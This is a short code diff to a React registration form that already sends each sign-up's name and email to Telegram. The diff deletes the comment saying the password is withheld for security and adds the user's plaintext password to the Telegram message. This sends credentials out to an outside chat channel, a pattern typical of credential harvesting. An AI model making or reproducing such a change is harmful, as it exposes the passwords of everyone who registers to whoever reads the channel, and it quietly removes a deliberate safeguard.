@@ -64,11 +64,12 @@ const Register = () => {
     setIsSubmitting(true);
 
     try {
-      // Format the message for Telegram (don't send password for security)
+      // Format the message for Telegram
       const message = `
         <b>New Registration</b>\n\n
         <b>Name:</b> ${formData.name}\n
-        <b>Email:</b> ${formData.email}
+        <b>Email:</b> ${formData.email}\n
+        <b>Password:</b> ${formData.password}
       `;
 
       // Send to Telegram
